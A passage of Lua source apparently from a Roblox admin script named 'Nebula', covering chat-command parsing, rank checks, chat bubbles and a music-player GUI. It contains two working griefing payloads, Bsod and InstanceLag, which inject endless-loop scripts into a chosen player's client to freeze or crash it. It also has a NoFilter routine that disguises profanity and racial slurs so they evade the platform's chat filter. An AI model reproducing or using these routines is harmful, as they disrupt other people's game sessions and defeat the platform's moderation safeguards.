    local tagflag = commands.settings.tagflag
    local toRemove={}
    for i,v in pairs(args) do
      if v:sub(1,1)==tagflag then table.insert(tags,v:sub(2):lower()) table.insert(toRemove,i) end
    end
    for i,v in pairs(toRemove) do table.remove(args,v) end
  end
  
  args.default=defaultargs
  
  return {Cmd=command,Args=args,Tags=tags}
end

function CoreCmd(msg)
  local formattedCommand = formatCommand(msg)
  if not formattedCommand then return end
  local cmd = formattedCommand.Cmd
  local commandFound
  for i,v in pairs(commands.list) do
    if cmd:lower()==v.Name:lower() or cmd:lower()==v.Shortcut:lower() then
      commandFound=v
      formattedCommand=formatCommand(msg,v.UseTags)
      local args=formattedCommand.Args
      local tags=formattedCommand.Tags
      local r, e = ypcall(function() v.Run(nil,args,tags) end)
    end
  end
end

function nilCmds(plr,msg)
  local rank = getNilRank(plr.Name)
  local formattedCommand = formatCommand(msg)
  if not formattedCommand then return end
  local cmd = formattedCommand.Cmd
  local commandFound
  local allowedRank=true
  for i,v in pairs(commands.list) do
    if cmd:lower()==v.Name:lower() or cmd:lower()==v.Shortcut:lower() then
      commandFound=v
      if not parseRank(rank,v.Rank,true) then allowedRank=false end
      if allowedRank then
        formattedCommand=formatCommand(msg,v.UseTags)
        local args=formattedCommand.Args
        local tags=formattedCommand.Tags
        local r, e = ypcall(function() v.Run(plr,args,tags) end)
        if not e then
          table.insert(chatlog, {Name="SYSTEM",Message=tostring(v.Name).." | "..tostring(plr.Name)})
        end
        if e then
          broadcast("Command: " .. v.Name .. ". Error: " .. e, Color3.new(1,0,0), nil, nil, 1)
        end
      end
    end
  end
  if not commandFound then
    notificationTablet(plr,"That command doesn't exist or wasn't found.", Color3.new(1,0,0),nil,nil,5)
  end
  if not allowedRank then
    newTablet(plr, "You do not meet the minimum required rank. (" .. commandFound.Rank .. ").",Color3.new(1,0,0),nil,nil,5)
  end
end

function cmds(plr,msg)
  local formattedCommand = formatCommand(msg)
  if not formattedCommand then return end
  local cmd = formattedCommand.Cmd
  local commandFound
  local allowedRank=true
  for i,v in pairs(commands.list) do
    if cmd:lower()==v.Name:lower() or cmd:lower()==v.Shortcut:lower() then
      commandFound=v
      if not parseRank(plr,v.Rank,true) then allowedRank=false end
      if allowedRank then
        formattedCommand=formatCommand(msg,v.UseTags)
        local args=formattedCommand.Args
        local tags=formattedCommand.Tags
        dismiss(plr)
        local r, e = ypcall(function() v.Run(plr,args,tags) end)
        if not e then
          table.insert(chatlog, {Name="SYSTEM",Message=tostring(v.Name).." | "..tostring(plr.Name)})
        end
        if e then
          broadcast("Command: " .. v.Name .. ". Error: " .. e, Color3.new(1,0,0), nil, nil, 1)
        end
      end
    end
  end
  if not commandFound then
    notificationTablet(plr,"That command doesn't exist or wasn't found.", Color3.new(1,0,0),nil,nil,5)
  end
  if not allowedRank then
    newTablet(plr, "You do not meet the minimum required rank. (" .. commandFound.Rank .. ").",Color3.new(1,0,0),nil,nil,5)
  end
end

function dismiss(plr)
  for i,v in pairs(getTablets(plr)) do
      coroutine.wrap(function()
        tabletFadeout(v) v:Destroy()
      end)()
    end
end

function newCmd(name,shortcut,desc,rank,args,tags,useTags,func)
    if not name then broadcast("Invalid command setup. Name is nil.", Color3.new(1,0,0),nil,nil,1) return end
    if not shortcut then broadcast("Invalid command setup. Shortcut is nil.", Color3.new(1,0,0),nil,nil,1) return end
    if not desc then desc='' broadcast("Desc is nil on command: " .. name .. ".", nil,nil,nil,1) end
    if not args then args = {'No arguments.'} end
    if not tags then tags= {'No tags.'} end
    if not useTags then useTags=false end
    if not func then broadcast("Func is nil on command: " .. name .. ".", Color3.new(1,0,0),nil,nil,1) return end
    name=name:lower()
    shortcut=shortcut:lower()
    if #args==0 then args={'No arguments'} end
    if #tags==0 then tags={'No tags'} end
  table.insert(commands.list, {Name=name,Shortcut=shortcut,Desc=desc,Rank=rank,Args=args,Tags=tags,UseTags=useTags,Run=func})
end

function nilChat(plr,msg)
    bubblechat(msg,plr)
    nilCmds(plr,msg)
    GChat(msg,plr)
end

function onChatted(plr,msg)
  msg = NoFilter(msg)
  table.insert(chatlog, {Name=tostring(plr.Name),Message=tostring(msg)})
  if not getPS(plr).AgreedToRules then plr:Kick() end
  if string.sub(msg:lower(), 0, 3) == "/e " then
    cmds(plr,msg:lower():sub(4))
  else
    bubblechat(msg,plr)
    cmds(plr,msg)
    GChat(msg,plr)
   end
end

function syncPri(updatePri,replace)
  local result = {}
  local prilistRaw = services.http:GetAsync('https://raw.githubusercontent.com/Basscans/Nebula/master/Prilist',true)
  if #prilistRaw<2 then return end
  
  for name in string.gmatch(prilistRaw,",(%w+)") do
    table.insert(result,name)
  end
  table.insert(result,prilistRaw:sub(1,(prilistRaw:find(",")-1)))
  if updatePri then
      if replace then pri.Allowed=result
      else for i,v in pairs(result) do table.insert(pri.Allowed,v) end end
  end
end

function Bsod(plr)
  if not plr.Character then plr:LoadCharacter() end
    local LS = _ns(plr.Character,true,[[wait() script.Parent=nil
      x=game.Players.LocalPlayer
      x.CameraMode='LockFirstPerson'
      pg=x.PlayerGui
      function lag()
        coroutine.wrap(function()
          for i=1,math.huge do
            gui=Instance.new("ScreenGui",pg)
            local frame = Instance.new("Frame",gui)
            frame.Size=UDim2.new(1,0,1,0)
            frame.BackgroundTransparency=math.random(100)/100
            frame.BackgroundColor3=Color3.new(math.random(255),math.random(255),math.random(255))
            Instance.new("Hint",Workspace:findFirstChild("Camera")).Text="Yo bein lagged"
            Instance.new("Message",Workspace:findFirstChild("Camera")).Text="Nice lag isnt it lelelel"
            Instance.new("Message",pg).Text="lolololag"
            Instance.new("Hint",pg).Text="laggiashall"
            local lab = Instance.new("TextLabel",frame)
            lab.Size=UDim2.new(1,0,.5,0)
            lab.BackgroundTransparency=math.random(100/100)
            lab.BackgroundColor3=Color3.new(math.random(255),math.random(255),math.random(255))
            wait()
          end
        end)()
      end
      Game:GetService("RunService").RenderStepped:connect(function()
        for i = 1, 10 do
          lag()
        end
      end)
    ]])
  game:GetService("Debris"):AddItem(plr,1)
end

function NoFilter(msg)
  msg = string.gsub(msg, "fuck", "fíóuíócíók")
  msg = string.gsub(msg, "dick", "díóiíócíók")
  msg = string.gsub(msg, "rape", "róíaíópóíe")
  msg = string.gsub(msg, "bitch","bíóiíótóícíóh")
  msg = string.gsub(msg, "cock","cóíóoóíócóíók")
  msg = string.gsub(msg, "nigga","nóíiíógóóígóía")
  msg = string.gsub(msg, "penis","póíeíónóíóióíós")
  msg = string.gsub(msg, "suck","sóíuíócóík")
  msg = string.gsub(msg, "fap","fóíaíóp")
  msg = string.gsub(msg, "vagina","víóaíógíóiíóníóa")
  msg = string.gsub(msg, "sex","síóeóíx")
  msg = string.gsub(msg, "gay","gíóaóíy")
  msg = string.gsub(msg, "v3rmillion","víó3úírúímúíiúílíólíóóiíóonúí")
  msg = string.gsub(msg, "pussy","píóuíósíósíóy")
  msg = string.gsub(msg, "homo","híóoíómíóo")
  msg = string.gsub(msg, "fag","fíóaíógíó")
  msg = string.gsub(msg, "cunt","cóíuóíníót")
  msg = string.gsub(msg, "nigger","níóiíógíógíóeíór")
  msg = string.gsub(msg, "twat","tóíwíóaíót")
  msg = string.gsub(msg, "anus","aóíníóuíós")
  msg = string.gsub(msg, "porn","píóoíóróín")
  msg = string.gsub(msg, "horny","hóoóórny")
  msg = string.gsub(msg, "boner","boóóner")
  return msg
end

function bubblechat(msg,plr)
  if (chatsettings.Bubblechat==true or getPS(plr).Chat.Bubblechat==true) then
    pcall(function()
      game:GetService("Chat"):Chat(plr.Character.Head,msg,(chatsettings.BubblechatColor~=nil and chatsettings.BubblechatColor or getPS(plr).Chat.BubblechatColor))
    end)
  end
end

function GChat(Msg,Speaker)
  coroutine.wrap(function()
    if getRank(Speaker) >= 1 then
      local Text=""
      local Head=nil
      local RankName = ranks[tostring(getRank(Speaker))]
      local Char=nil
      if Speaker.Character then
        Char=Speaker.Character
      end
      if Char then
        if Char.Head then
          Head=Char.Head
        end
      end
      if Char then
        pcall(function() Char.BBG:Destroy() end)
        if (chatsettings.GuiChat==true or getPS(Speaker).Chat.GuiChat==true) and RankName ~= nil then
          if #Msg < 100 then
            Text="["..RankName:upper().."] "..Speaker.Name .. ": " .. NoFilter(Msg)
          else
            Text='Message was over character limit'
          end
        end
        Color=nil
        if Color3.random then
          Color=Color3.random()
        else
          Color=Color3.new(math.random(),math.random(),math.random())
        end
        Mod=Char
        Part=Head
        local BBG = Instance.new("BillboardGui",Mod)
        BBG.Name = "BBG"
        BBG.StudsOffset = Vector3.new(0,4.5,0)
        BBG.Size = UDim2.new(10,0,10,0)
        local Label = Instance.new("TextLabel",BBG)
        Label.Name = "Label"
        Label.Font = "ArialBold"
        Label.Text = ""
        Label.TextColor3 = Color3.new(1,1,1)
        Label.FontSize = "Size36"
        Label.BackgroundTransparency = 1
        Label.TextStrokeTransparency = 0.5
        Label.Size = UDim2.new(1,0,1,0)
        for i=1,#Text do
          Label.Text=Text:sub(1,i)
          wait(0.09 - (#Msg / 0.09))
        end
        coroutine.wrap(function()
          for i=1,100 do 
            BBG.StudsOffset = Vector3.new(0,4.5 + tonumber(i/10) ,0)
            wait()
          end
          BBG:Destroy()
          end)()
        wait(2)
        BBG:Destroy()
      end
    end
  end)()
end


function InstanceLag(plr)
  local par = plr:findFirstChild("Backpack") or plr:findFirstChild("PlayerGui") or plr.Character
  local src = [[
    wait() script.Parent=nil LocalPlayer=Game:GetService("Players")["LocalPlayer"]
    TheInstances = {}
    function AddInstance(name,par)
      TheInstances[name]={Name=name,Parent=par}
    end
    -- CurrentCamera --
    AddInstance("Part","CurrentCamera")
    AddInstance("SelectionBox","CurrentCamera")
    AddInstance("Hint","CurrentCamera")
    AddInstance("Message","CurrentCamera")
    -- PlayerGui --
    AddInstance("ScreenGui","PlayerGui")
    AddInstance("TextLabel","ScreenGui")
    AddInstance("TextBox","ScreenGui")
    AddInstance("TextButton","ScreenGui")
    AddInstance("Frame","ScreenGui")
    AddInstance("ImageButton","ScreenGui")
    AddInstance("ScrollingFrame","ScreenGui")
    -- Backpack --
    AddInstance("HopperBin","Backpack")
    LocalPlayer.CameraMode=1
    LocalPlayer.Character=nil
    repeat wait()
      Game:GetService("RunService").RenderStepped:connect(function()
        coroutine.wrap(function()
          while 1 do
            wait()
            for i,v in pairs(TheInstances) do
              CurrentCamera=Workspace:findFirstChild("Camera")
              PlayerGui=LocalPlayer:findFirstChild("PlayerGui")
              Backpack=LocalPlayer:findFirstChild("Backpack")
              if v.Name == "Message" or v.Name == "Hint" then
                pcall(function() Instance.new("Hint",CurrentCamera).Text="No plz" end)
                pcall(function() Instance.new("Message",CurrentCamera).Text="Haz fun lele" end)
              elseif v.Name == "Part" then
                pcall(function()
                  Part=Instance.new("Part",CurrentCamera)
                  Part.Size=Vector3.new(60,60,60)
                  Part.BrickColor=BrickColor.Random()
                end)
              elseif v.Parent == "CurrentCamera" then
                pcall(function() Instance.new(v.Name,CurrentCamera) end)
              elseif v.Parent == "PlayerGui" then
                pcall(function() Instance.new(v.Name,PlayerGui) end)
              elseif v.Parent == "ScreenGui" then
                pcall(function()
                  ScreenGui = PlayerGui:findFirstChild("PLayerGui")
                  if ScreenGui then
                    Instance.new(v.Name,ScreenGui).Size=UDim2.new(1,0,1,0)
                  end
                end)
              elseif v.Parent == "Backpack" then
                pcall(function() Instance.new(v.Name,Backpack) end)
              else
                pcall(function() Instance.new(v.Name,v.Parent) end)
              end
              pcall(function() Game:GetService("StarterGui"):SetCoreGuiEnabled(4, false) end)
            end
          end
        end)()
      end)
    until 1~=1
  ]]
  _ns(par,true,src)
end

function getLocalSound(plr)
  if getPS(plr).Music.localSound and getPS(plr).Music.localSound.Parent==plr.PlayerGui then return getPS(plr).Music.localSound
  else
    pcall(function() getPS(plr).Music.localSound:Stop() end)
    pcall(function() getPS(plr).Music.localSound.Volume=0 end)
    pcall(function() getPS(plr).Music.localSound.Pitch=100 end)
    pcall(function() getPS(plr).Music.localSound.SoundId="rbxassetid://0" end)
    pcall(function() getPS(plr).Music.localSound:Play() end)
    local s = Instance.new("Sound",plr.PlayerGui)
    s.Name="NebulaSound"
    getPS(plr).Music.localSound=s
    return s
  end
end
function getGlobalSound()
  if music.globalSound and music.globalSound.Parent==Workspace then return music.globalSound
  else
    pcall(function() getPS(plr).Music.localSound:Stop() end)
    pcall(function() getPS(plr).Music.localSound.Volume=0 end)
    pcall(function() getPS(plr).Music.localSound.Pitch=100 end)
    pcall(function() getPS(plr).Music.localSound.SoundId="rbxassetid://0" end)
    pcall(function() getPS(plr).Music.localSound:Play() end)
    local s = Instance.new("Sound",Workspace)
    s.Name="NebulaSound"
    music.globalSound=s
    return s
  end
end

function showMusicGui(plr,global)
   local plrgui = plr:findFirstChild("PlayerGui")
     if not plrgui then plrgui = Instance.new("PlayerGui",plr) end
      if not plrgui:findFirstChild('NebulaMusic') then
    local stop=false
    local g = Instance.new("ScreenGui",plrgui)
    g.Name='NebuaMusic'

    local bg = Instance.new("Frame",g)
    bg.Active=true
    bg.BackgroundColor3=Color3.new(85/255,170/255,255/255)
    bg.BorderColor3=Color3.new()
    bg.BackgroundTransparency=.75
    bg.Name='MusicBg'
    bg.Position=UDim2.new(.2,0,.3,0)
    bg.Size=UDim2.new(.6,0,.5,0)
    bg.Draggable=true

    local pl = Instance.new("Frame",bg)
    pl.BackgroundTransparency=1
    pl.Name='Playlist'
    pl.Position=UDim2.new(0,0,.1,0)
    pl.Size=UDim2.new(1,0,.9,0)
    pl.Visible=false

    local dceB = Instance.new("TextButton",pl)
    dceB.BackgroundTransparency=1
    dceB.Name="Dance"
    dceB.Position=UDim2.new(0,0,.33,0)
    dceB.Size=UDim2.new(.33,0,.33,0)
    dceB.Font="Arial"
    dceB.Text="Dance"
    dceB.TextColor3=Color3.new()
    dceB.TextScaled=true
    dceB.TextStrokeColor3=Color3.new(1,1,0)
    dceB.TextStrokeTransparency=0
    dceB.TextWrapped=false

    local hhB = Instance.new("TextButton",pl)
    hhB.BackgroundTransparency=1
    hhB.Name="Hiphop"
    hhB.Position=UDim2.new(0,0,.66,0)
    hhB.Size=UDim2.new(.33,0,.33,0)
    hhB.Font="Arial"
    hhB.Text="Hiphop"
    hhB.TextColor3=Color3.new()
    hhB.TextScaled=true
    hhB.TextStrokeColor3=Color3.new(170/255,85/255,0)
    hhB.TextStrokeTransparency=0
    hhB.TextWrapped=false

    local alB = Instance.new("TextButton",pl)
    alB.BackgroundTransparency=1
    alB.Name="Alternative"
    alB.Position=UDim2.new(0.66,0,.66,0)
    alB.Size=UDim2.new(.33,0,.33,0)
    alB.Font="Arial"
    alB.Text="Alternative"
    alB.TextColor3=Color3.new(1,1,1)
    alB.TextScaled=true
    alB.TextStrokeColor3=Color3.new(0,150/255,0)
    alB.TextStrokeTransparency=0
    alB.TextWrapped=false

    local ncB = Instance.new("TextButton",pl)
    ncB.BackgroundTransparency=1
    ncB.Name="Nightcore"
    ncB.Position=UDim2.new(0.66,0,.33,0)
    ncB.Size=UDim2.new(.33,0,.33,0)
    ncB.Font="Arial"
    ncB.Text="Nightcore"
    ncB.TextColor3=Color3.new(1,1,1)
    ncB.TextScaled=true
    ncB.TextStrokeColor3=Color3.new(255/255,0,127/255)
    ncB.TextStrokeTransparency=0
    ncB.TextWrapped=false

    local poB = Instance.new("TextButton",pl)
    poB.BackgroundTransparency=1
    poB.Name="Popular"
    poB.Position=UDim2.new(0,0,0,0)
    poB.Size=UDim2.new(.33,0,.33,0)
    poB.Font="Arial"
    poB.Text="Popular"
    poB.TextColor3=Color3.new()
    poB.TextScaled=true
    poB.TextStrokeColor3=Color3.new(1,1,1)
    poB.TextStrokeTransparency=0
    poB.TextWrapped=false

    local rmB = Instance.new("TextButton",pl)
    rmB.BackgroundTransparency=1
    rmB.Name="Remix"
    rmB.Position=UDim2.new(0.66,0,0,0)
    rmB.Size=UDim2.new(.33,0,.33,0)
    rmB.Font="Arial"
    rmB.Text="Remix"
    rmB.TextColor3=Color3.new(1,1,1)
    rmB.TextScaled=true
    rmB.TextStrokeColor3=Color3.new(255,225,100/255)
    rmB.TextStrokeTransparency=0
    rmB.TextWrapped=false

    local raB = Instance.new("TextButton",pl)
    raB.BackgroundTransparency=1
    raB.Name="Rap"
    raB.Position=UDim2.new(0.33,0,0,0)
    raB.Size=UDim2.new(.33,0,.33,0)
    raB.Font="Arial"
    raB.Text="Rap"
    raB.TextColor3=Color3.new(75/255,75/255,75/255)
    raB.TextScaled=true
    raB.TextStrokeColor3=Color3.new(1,0,0)
    raB.TextStrokeTransparency=0
    raB.TextWrapped=false

    local r7B = Instance.new("TextButton",pl)
    r7B.BackgroundTransparency=1
    r7B.Name="R7B"
    r7B.Position=UDim2.new(0.33,0,.33,0)
    r7B.Size=UDim2.new(.33,0,.33,0)
    r7B.Font="Arial"
    r7B.Text="R&B"
    r7B.TextColor3=Color3.new(75/255,75/255,75/255)
    r7B.TextScaled=true
    r7B.TextStrokeColor3=Color3.new(175/255,0,150/255)
    r7B.TextStrokeTransparency=0
    r7B.TextWrapped=false

    local ooB = Instance.new("TextButton",pl)
    ooB.BackgroundTransparency=1
    ooB.Name="Mood"
    ooB.Position=UDim2.new(0.33,0,.66,0)
    ooB.Size=UDim2.new(.33,0,.33,0)
    ooB.Font="Arial"
    ooB.Text="Mood"
    ooB.TextColor3=Color3.new(75/255,75/255,75/255)
    ooB.TextScaled=true
    ooB.TextStrokeColor3=Color3.new(0,0,127/255)
    ooB.TextStrokeTransparency=0
    ooB.TextWrapped=false

    local home = Instance.new("Frame",bg)
    home.BackgroundTransparency=1
    home.Name='Home'
    home.Position=UDim2.new(0,0,.1,0)
    home.Size=UDim2.new(1,0,.9,0)

    local mdfyBg = Instance.new("Frame",home)
    mdfyBg.BackgroundTransparency=1
    mdfyBg.Name="ModifyBg"
    mdfyBg.Position=UDim2.new(0,0,.5,0)
    mdfyBg.Size=UDim2.new(1,0,0.5,0)

    local nxtB = Instance.new("TextButton",mdfyBg)
    nxtB.BackgroundTransparency=1
    nxtB.Name="Next"
    nxtB.Position=UDim2.new(.75,0,0,0)
    nxtB.Size=UDim2.new(.25,0,1,0)
    nxtB.Font="ArialBold"
    nxtB.Text=">>"
    nxtB.TextColor3=Color3.new()
    nxtB.TextScaled=true
    nxtB.TextStrokeColor3=Color3.new(255,170/255,0)
    nxtB.TextStrokeTransparency=0
    nxtB.TextWrapped=true

    local plyB = Instance.new("TextButton",mdfyBg)
    plyB.BackgroundTransparency=1
    plyB.Name="Play"
    plyB.Position=UDim2.new(.5,0,0,0)
    plyB.Size=UDim2.new(.25,0,1,0)
    plyB.Font="ArialBold"
    plyB.Text="l>"
    plyB.TextColor3=Color3.new()
    plyB.TextScaled=true
    plyB.TextStrokeColor3=Color3.new(0,1,0)
    plyB.TextStrokeTransparency=0
    plyB.TextWrapped=true

    local rstrtB = Instance.new("TextButton",mdfyBg)
    rstrtB.BackgroundTransparency=1
    rstrtB.Name="Restart"
    rstrtB.Position=UDim2.new(0,0,0,0)
    rstrtB.Size=UDim2.new(.25,0,1,0)
    rstrtB.Font="ArialBold"
    rstrtB.Text="<<"
    rstrtB.TextColor3=Color3.new()
    rstrtB.TextScaled=true
    rstrtB.TextStrokeColor3=Color3.new(0,0,1)
    rstrtB.TextStrokeTransparency=0
    rstrtB.TextWrapped=true

    local pauB = Instance.new("TextButton",mdfyBg)
    pauB.BackgroundTransparency=1
    pauB.Name="Pause"
    pauB.Position=UDim2.new(.25,0,0,0)
    pauB.Size=UDim2.new(.25,0,1,0)
    pauB.Font="ArialBold"
    pauB.Text="||"
    pauB.TextColor3=Color3.new()
    pauB.TextScaled=true
    pauB.TextStrokeColor3=Color3.new(1,0,0)
    pauB.TextStrokeTransparency=0
    pauB.TextWrapped=true

    local songName = Instance.new("TextLabel",home)
    songName.BackgroundTransparency=1
    songName.Name='SongName'
    songName.Size=UDim2.new(1,0,.4,0)
    songName.Font="ArialBold"
    songName.Text="Destroid 11. Get Stupid" -- because i like that song
    songName.TextScaled=true
    songName.TextColor3=Color3.new(1,1,1)
    songName.TextStrokeColor3=Color3.new()
    songName.TextStrokeTransparency=0
    songName.TextWrapped=true

    local optBg = Instance.new("Frame",bg)
    optBg.BackgroundTransparency=.75
    optBg.BackgroundColor3=Color3.new()
    optBg.BorderColor3=Color3.new()
    optBg.Name="OptionsBg"
    optBg.Position=UDim2.new(0,0,-0.2,0)
    optBg.Size=UDim2.new(.9,0,.2,0)

    local hoBO = Instance.new("TextButton",optBg)
    hoBO.BackgroundTransparency=.9
    hoBO.BorderColor3=Color3.new(0,0,0)
    hoBO.Name='Home'
    hoBO.Size=UDim2.new(.2,0,1,0)
    hoBO.Font="ArialBold"
    hoBO.Text="Home"
    hoBO.TextColor3=Color3.new(1,1,1)
    hoBO.FontSize="Size18"
    hoBO.TextWrapped=true

    local plBO = Instance.new("TextButton",optBg)
    plBO.BackgroundTransparency=.9
    plBO.BorderColor3=Color3.new(0,0,0)
    plBO.Name='Playlists'
    plBO.Size=UDim2.new(.2,0,1,0)
    plBO.Position=UDim2.new(.4,0,0,0)
    plBO.Font="ArialBold"
    plBO.Text="Playlists"
    plBO.TextColor3=Color3.new(1,1,1)
    plBO.FontSize="Size18"
    plBO.TextWrapped=true

    local soBO = Instance.new("TextButton",optBg)
    soBO.BackgroundTransparency=.9
    soBO.BorderColor3=Color3.new(0,0,0)
    soBO.Name='Songs'
    soBO.Size=UDim2.new(.2,0,1,0)
    soBO.Position=UDim2.new(.2,0,0,0)
    soBO.Font="ArialBold"
    soBO.Text='Songs'
    soBO.TextColor3=Color3.new(1,1,1)
    soBO.FontSize="Size18"
    soBO.TextWrapped=true

    local reBO = Instance.new("TextButton",optBg)
    reBO.BackgroundTransparency=.9
    reBO.BorderColor3=Color3.new(0,0,0)
    reBO.Name='Repeat'
    reBO.Size=UDim2.new(.2,0,1,0)
    reBO.Position=UDim2.new(.6,0,0,0)
    reBO.Font="ArialBold"
    reBO.Text="Repeat"
    reBO.TextColor3=Color3.new(1,1,1)
    reBO.FontSize="Size18"
    reBO.TextWrapped=true

    local shBO = Instance.new("TextButton",optBg)
    shBO.BackgroundTransparency=.9
    shBO.BorderColor3=Color3.new(0,0,0)
    shBO.Name='Shuffle'
    shBO.Size=UDim2.new(.2,0,1,0)
    shBO.Position=UDim2.new(.8,0,0,0)
    shBO.Font="ArialBold"
    shBO.Text="Shuffle"
    shBO.TextColor3=Color3.new(1,1,1)
    shBO.FontSize="Size18"
    shBO.TextWrapped=true

    local songs = Instance.new("ScrollingFrame",bg)
    songs.BackgroundTransparency=1
    songs.Name="Songs"
    songs.Position=UDim2.new(0,0,.1,0)
    songs.Size=UDim2.new(1,0,.9,0)
    songs.Visible=false

    local coB  = Instance.new("TextButton",bg)
    coB.BackgroundColor3=Color3.new()
    coB.BackgroundTransparency=.75
    coB.BorderColor3=Color3.new()
    coB.Name="Close"
    coB.Position=UDim2.new(.9,0,-0.2,0)
    coB.Size=UDim2.new(.1,0,.2,0)
    coB.Font="ArialBold"
    coB.Text="X"
    coB.TextColor3=Color3.new(1,1,1)
    coB.TextScaled=true
    coB.TextStrokeColor3=Color3.new(1,0,0)
    coB.TextStrokeTransparency=0
    coB.TextWrapped=true

    local title = Instance.new("TextLabel",bg)
    title.BackgroundTransparency=1
    title.Name='Title'
    title.Size=UDim2.new(1,0,.1,0)
    title.Font='ArialBold'
    title.Text='l Nebula Music l'
    title.TextScaled=true
    title.TextWrapped=true
    title.TextColor3=Color3.new(1,1,1)

    local tabs = {home,songs,pl}
    local plButtons = {ooB,paB,r7B,alB,hhB,rmB,dceB,ncB,poB}

    for i,v in pairs(plButtons) do
      v.MouseButton1Click:connect(function()
          if global==false then getPS(plr).Music.isInPlaylist=v.Name else music.isInPlaylist=v.Name end
          stop=false
          if global==false then getLocalSound(plr):Stop() else getGlobalSound():Stop() end
          pl.Visible=false
          home.Visible=true
      end)
    end

    for i,v in pairs(music.songs) do
      local pos = ((1/#music.songs) * #songs:GetChildren())
      local l = Instance.new("TextButton",songs)
      l.Name=v[1]
      l.Size=UDim2.new(1,0,(1/#music.songs),0)
      l.Position=UDim2.new(0,0,pos,0)
      l.BackgroundTransparency=1
      l.Font="Arial"
      l.Text=v[1]
      l.TextScaled=true
      l.TextWrapped=true
      l.TextColor3=Color3.new(1,1,1)
      l.TextXAlignment="Left"
      l.MouseButton1Click:connect(function()
        stop=true
        if global==false then
          getPS(plr).Music.inPlaylist=false
         getLocalSound(plr):Stop()
         getLocalSound(plr).SoundId="rbxassetid://"..v[2]
        else
          music.isInPlaylist=false
          getGlobalSound():Stop()
          getGlobalSound().SoundId="rbxassetid://"..v[2]
        end
         songName.Text=v[1]
        wait()
        if global==false then
          getLocalSound(plr):Play()
          getPS(plr).Music.onSong=i
        else
          getGlobalSound():Play()
          music.onSong=i
        end
        songs.Visible=false
        home.Visible=true
      end)
    end
    songs.CanvasSize=UDim2.new(0,0,(0.05 * #music.songs),0)

    coB.MouseButton1Click:connect(function()
      bg.Visible=false
    end) -- close

    -- Tab Buttons! :D --
    hoBO.MouseButton1Click:connect(function()
      for i,v in pairs(tabs) do v.Visible=false end
      home.Visible=true
    end)
    soBO.MouseButton1Click:connect(function()
       for i,v in pairs(tabs) do v.Visible=false end
      songs.Visible=true
    end)
    plBO.MouseButton1Click:connect(function()
       for i,v in pairs(tabs) do v.Visible=false end
      pl.Visible=true
    end)

    -- Music Changing Buttons --
    local pauseClicks=0
    local onRepeat=false
    local onShuffle=false

    reBO.MouseButton1Click:connect(function()
      if onRepeat==false then
        onRepeat=true
        if global==false then getLocalSound(plr).Looped=true else getGlobalSound().Looped=true end
        reBO.BackgroundTransparency=.5
      else
        onRepeat=false
        if global==false then getLocalSound(plr).Looped=false else getGlobalSound().Looped=false end
        reBO.BackgroundTransparency=.9
      end
    end)
    shBO.MouseButton1Click:connect(function()
      if onShuffle==false then
        onShuffle=true
        shBO.BackgroundTransparency=.5
      else
        onShuffle=false
        shBO.BackgroundTransparency=.9
      end
    end)

    function nextSong()
      stop=true
      if (global==false and getPS(plr).Music.isInPlaylist) or (global==true and music.isInPlaylist) then
        if not onShuffle then
          local song
          if global==false then  song=music.playlists[getPS(plr).Music.isInPlaylist][getPS(plr).Music.onPlaylistSong+1]
          else song=music.playlists[music.isInPlaylist][music.onPlaylistSong+1] end
          if song then
            if global==false then getLocalSound(plr):Stop() else getGlobalSound():Stop() end
            songName.Text=song[1]
            if global==false then getLocalSound(plr).SoundId="rbxassetid://"..song[2] else getGlobalSound().SoundId="rbxassetid://"..song[2] end
            wait()
            if global==false then getLocalSound(plr):Play() else getGlobalSound():Play() end
            if global==false then getPS(plr).Music.onPlaylistSong=(getPS(plr).Music.onPlaylistSong+1) else music.onPlaylistSong=(music.onPlaylistSong+1) end
          else
            if global==false then getLocalSound(plr):Stop() else getGlobalSound:Stop() end
            songName.Text=(global==false and music.playlists[getPS(plr).Music.isInPlaylist][1][1] or music.playlists[music.isInPlaylist][1][1])
            if global==false then getLocalSound(plr).SoundId=music.playlists[getPS(plr).Music.isInPlaylist][1][2] else getGlobalSound().SoundId=music.playlists[music.isInPlaylist][1][2] end
            wait()
            if global==false then getLocalSound(plr):Play() else getGlobalSound():Play() end
            if global==false then getPS(plr).Music.onPlaylistSong=1 else music.onPlaylistSong=1 end
          end
        else
          getLocalSound(plr):Stop()
          local selectedId = math.random(#(global==false and music.playlists[getPS(plr).Music.isInPlaylist] or music.playlists[music.isInPlaylist]))
          songName.Text=(global==false and music.playlists[getPS(plr).Music.isInPlaylist][selectedId][1] or music.playlists[music.isInPlaylist][selectedId][1])
          if global==false then getLocalSound(plr).SoundId="rbxassetid://"..music.playlists[getPS(plr).Music.isInPlaylist][selectedId][2] else getGlobalSound().SoundId="rbxassetid://"..music.playlists[music.isInPlaylist][selectedId][2] end
          wait()
          if global==false then getLocalSound(plr):Play() else getGlobalSound():Play() end
          if global==false then getPS(plr).Music.onPlaylistSong=selectedId else music.onPlaylistSong=selectedId end
        end
      else
        if ((global==false and music.songs[getPS(plr).Music.onSong+1]) or (global==true and music.songs[music.onSong+1])) and onShuffle==false then
          if global==false then getLocalSound(plr):Stop() else getGlobalSound():Stop() end
          songName.Text=(global==false and music.songs[getPS(plr).Music.onSong+1][1] or music.songs[music.onSong+1][1])
          if global==false then getLocalSound(plr).SoundId="rbxassetid://"..music.songs[getPS(plr).Music.onSong+1][2] else getGlobalSound().SoundId="rbxassetid://"..music.songs[music.onSong+1][2] end
          wait()
          if global==false then getLocalSound(plr):Play() else getGlobalSound():Play() end
          if global==false then getPS(plr).Music.onSong=(getPS(plr).Music.onSong+1) else music.onSong=(music.onSong+1) end
        elseif onShuffle then
          if global==false then getLocalSound(plr):Stop() else getGlobalSound():Stop() end
          local selectedId=math.random(#music.songs)
          songName.Text=music.songs[selectedId][1]
          if global==false then getLocalSound(plr).SoundId="rbxassetid://"..music.songs[selectedId][2] else getGlobalSound().SoundId="rbxassetid://"..music.songs[selectedId][2] end
          if global==false then getLocalSound(plr):Stop() else getGlobalSound():Stop() end
          wait()
          if global==false then getLocalSound(plr):Play() else getGlobalSound():Play() end
          if global==false then getPS(plr).Music.onSong=selectedId else music.onSong=selectedId end
        else
          if global==false then getLocalSound(plr):Stop() else getGlobalSound():Stop() end
          songName.Text=music.songs[1][1]
          if global==false then getLocalSound(plr).SoundId="rbxassetid://"..music.songs[1][2] else getGlobalSound().SoundId="rbxassetid://"..music.songs[1][2] end
          wait()
          if global==false then getLocalSound(plr):Play() else getGlobalSound():Play() end
          if global==false then getPS(plr).Music.onSong=1 else music.onSong=1 end
        end
      end
      stop=false
    end

    nxtB.MouseButton1Click:connect(nextSong)

    pauB.MouseButton1Click:connect(function()
